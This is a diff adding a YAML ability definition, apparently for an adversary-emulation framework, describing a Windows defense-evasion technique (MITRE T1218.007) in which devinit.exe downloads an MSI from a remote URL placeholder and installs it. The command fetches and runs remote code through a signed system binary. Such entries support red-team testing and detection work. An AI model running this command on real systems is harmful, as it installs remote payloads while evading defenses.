@@ -1,0 +1,22 @@
+- id: 639c9b28-bf64-c74e-1e2c-de0a8f3863dc
+  name: Devinit.exe - Downloads an MSI file to C:\Windows\Installer and then installs
+    it.
+  description: Downloads an MSI file to C:\Windows\Installer and then installs it.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.007
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+  singleton: true
+  privilege: User
+  repeatable: false
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: mr.d0x
+  created: '2022-01-20'
+  modified: '2022-01-20'
+  operating_system: Windows All Versions
